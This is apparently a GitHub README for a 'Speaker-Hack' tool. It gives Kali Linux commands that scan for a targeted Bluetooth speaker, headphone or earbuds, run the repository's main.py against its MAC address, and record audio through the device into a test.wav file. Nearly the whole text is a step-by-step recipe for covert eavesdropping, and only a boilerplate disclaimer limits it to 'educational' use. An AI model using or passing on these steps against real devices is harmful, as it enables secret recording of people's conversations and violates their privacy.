# Speaker-Hack
Hack the bluetooth speaker by using venbluez in kali linux

# Use Case
After running the series of commands the bluetooth device (speaker,headphone,earbuds) will record the audio and send it back to the your system

# ⚠️ Caution
This repository is created for educational and research purposes only.
Do **not** use any information or tools from this repository for illegal or unethical activities.
Unauthorized access to systems, networks, or data is illegal and punishable by law.
The author is **not responsible for any misuse or damage** caused by the information in this repository.
Users are responsible for complying with applicable laws and regulations.


## Installation (Only Works With Kali Linux)
sudo apt install bluez -y
sudo apt install pulseaudio -y
sudo apt install pulseaudio-utils -y
sudo apt install pulseaudio-module-bluetooth -y

git clone https://github.com/saurabhAT28/Speaker-Hack.git
cd Speaker-Hack

## Start the bluetooth
sudo systemctl restart bluetooth

## Scan the bluetooth device
spooftooph -s
Then you will get the list of bluetooth devices and then copy the MAC address of your targeted bluetooth device

## Run the program
python3 main.py -a {MAC Address you copied}
Then you will get the command in terminal starting from parecord
Then run this command in same terminal
After running this command bluetooth device start recording

## To stop recording
Press Ctrl + C

## Final Result
After stopping the recording you will see the test.wav in your Speaker-Hack directory
This test.wav contains recording and you can listen to it
